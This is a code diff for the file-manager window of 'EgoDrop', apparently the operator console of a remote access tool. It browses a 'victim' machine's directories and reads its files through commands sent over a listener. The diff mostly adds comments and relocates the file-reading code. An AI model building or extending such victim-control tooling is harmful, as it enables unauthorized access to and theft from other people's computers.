@@ -73,6 +73,12 @@ namespace EgoDrop
             m_szInitDir = string.Empty;
         }
 
+        /// <summary>
+        /// Victim received message event handler.
+        /// </summary>
+        /// <param name="listener">Listener object.</param>
+        /// <param name="victim">Victim object.</param>
+        /// <param name="lsMsg">Message list.</param>
         private void fnRecvMsg(clsListener listener, clsVictim victim, List<string> lsMsg)
         {
             if (!clsTools.fnbSameVictim(victim, m_victim))
@@ -84,7 +90,7 @@ namespace EgoDrop
                 {
                     if (lsMsg[0] == "file")
                     {
-                        if (lsMsg[1] == "init")
+                        if (lsMsg[1] == "init") //Initialization.
                         {
                             textBox1.Text = lsMsg[2];
                             textBox1.Tag = lsMsg[2];
@@ -94,21 +100,25 @@ namespace EgoDrop
                             treeView1.ExpandAll();
                             treeView1.SelectedNode = node;
                         }
-                        else if (lsMsg[1] == "sd")
+                        else if (lsMsg[1] == "sd") //Scan directory.
                         {
                             string szPath = lsMsg[2];
                             TreeNode tnNode = fnFindTreeNodeByPath(szPath, treeView1.Nodes);
+
+                            //Return if not exists.
                             if (tnNode == null)
                                 return;
 
-                            textBox1.Text = szPath;
-                            textBox1.Tag = szPath;
+                            textBox1.Text = szPath; //Current path.
+                            textBox1.Tag = szPath; //Current path.
                             listView1.Items.Clear();
 
+                            //Decapsulation.
                             List<List<string>> ls = clsEZData.fn2dLB64Decode(lsMsg[3]);
                             List<stFileInfo> lsFolder = new List<stFileInfo>();
                             List<stFileInfo> lsFile = new List<stFileInfo>();
 
+                            //Load file info into list.
                             foreach (var lFile in ls)
                             {
                                 string szFilePath = lFile[1];
@@ -144,6 +154,8 @@ namespace EgoDrop
                             lsFile.Sort((a, b) => a.szFileName.CompareTo(b.szFileName));
 
                             List<stFileInfo> lFinal = lsFolder.Concat(lsFile).ToList();
+
+                            //Add file info into treeview and listview.
                             foreach (var entry in lFinal)
                             {
                                 ListViewItem item = new ListViewItem(entry.szFileName);
@@ -164,44 +176,18 @@ namespace EgoDrop
                                 }
                             }
 
+                            //Expand node.
                             tnNode.Expand();
                             tnNode.EnsureVisible();
 
                             listView1.Refresh();
 
+                            //Show info.
                             toolStripStatusLabel1.Text = $"Folder[{lsFolder.Count}] File[{lsFile.Count}]";
                         }
-                        else if (lsMsg[1] == "wf")
+                        else if (lsMsg[1] == "goto") //Goto specified directory.
                         {
-
-                        }
-                        else if (lsMsg[1] == "rf")
-                        {
-                            frmFileEditor f = clsTools.fnFindForm<frmFileEditor>(victim);
-                            if (f == null)
-                            {
-                                f = new frmFileEditor(victim);
-                                f.Show();
-                            }
-                            else
-                            {
-                                f.BringToFront();
-                            }
-
-                            int nCode = int.Parse(lsMsg[2]);
-                            if (nCode == 0)
-                            {
-                                clsTools.fnShowErrMsgbox(lsMsg[4]);
-                                return;
-                            }
-
-                            string szFilePath = lsMsg[3];
-                            string szFileContent = lsMsg[4];
-
-                            f.fnAddNewPage(szFilePath, szFileContent);
-                        }
-                        else if (lsMsg[1] == "goto")
-                        {
+                            //Check specified directory existence.
                             int nCode = int.Parse(lsMsg[2]);
                             string szDirPath = lsMsg[3];
 
@@ -214,6 +200,7 @@ namespace EgoDrop
                                 return;
                             }
 
+                            //Do scandir if dir exists.
                             TreeNode tnNode = fnAddTreeNodeByPath(szDirPath);
                             treeView1.SelectedNode = tnNode;
                         }
@@ -370,6 +357,17 @@ namespace EgoDrop
 
         public void fnReadFile(string szFilePath)
         {
+            frmFileEditor f = clsTools.fnFindForm<frmFileEditor>(m_victim);
+            if (f == null)
+            {
+                f = new frmFileEditor(m_victim);
+                f.Show();
+            }
+            else
+            {
+                f.BringToFront();
+            }
+
             m_victim.fnSendCommand(new string[]
             {
                 "file",
@@ -519,6 +517,16 @@ namespace EgoDrop
             });
 
             listView1.LabelEdit = false;
+        }
+
+        private void toolStripMenuItem3_Click(object sender, EventArgs e)
+        {
+            ListViewItem item = listView1.SelectedItems.Cast<ListViewItem>().First();
+            if (item == null)
+                return;
+
+            stFileInfo info = fnGetInfoStruct(item);
+            fnReadFile(info.szFilePath);
         }
     }
 }
